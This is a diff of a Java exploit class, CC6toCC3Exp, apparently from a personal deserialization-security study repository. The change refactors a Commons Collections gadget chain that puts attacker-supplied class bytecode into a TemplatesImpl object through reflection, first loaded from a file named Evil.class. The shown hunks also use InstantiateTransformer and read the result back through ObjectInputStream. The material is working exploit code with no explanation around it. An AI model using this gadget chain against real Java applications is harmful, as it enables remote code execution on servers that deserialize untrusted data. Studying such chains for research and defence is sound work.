@@ -22,20 +22,13 @@ import java.util.Map;
 public class CC6toCC3Exp {
     public static void main(String[] args) throws Exception{
         TemplatesImpl templates = new TemplatesImpl();
-        Class templatesClass = templates.getClass();
-        Field nameField = templatesClass.getDeclaredField("_name");
-        nameField.setAccessible(true);
-        nameField.set(templates,"fxxk");
+        setFieldValue(templates,"_name","NotNull");
 
-        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
-        bytecodesField.setAccessible(true);
-        byte[] evil = Files.readAllBytes(Paths.get("/home/n0zom1z0/Evil.class"));
+        byte[] evil = Files.readAllBytes(Paths.get("/home/web/Desktop/Java-Sec/Deserialization/CC3/target/classes/TemplatesBytes.class"));
         byte[][] codes = {evil};
-        bytecodesField.set(templates,codes);
+        setFieldValue(templates,"_bytecodes",codes);
 
-        Field tfactoryField = templatesClass.getDeclaredField("_tfactory");
-        tfactoryField.setAccessible(true);
-        tfactoryField.set(templates, new TransformerFactoryImpl());
+        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
         //    templates.newTransformer();
 
         InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class},
@@ -69,5 +62,10 @@ public class CC6toCC3Exp {
         ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
         Object obj = ois.readObject();
         return obj;
+    }
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception{
+        Field field = obj.getClass().getDeclaredField(fieldName);
+        field.setAccessible(true);
+        field.set(obj, value);
     }
 }
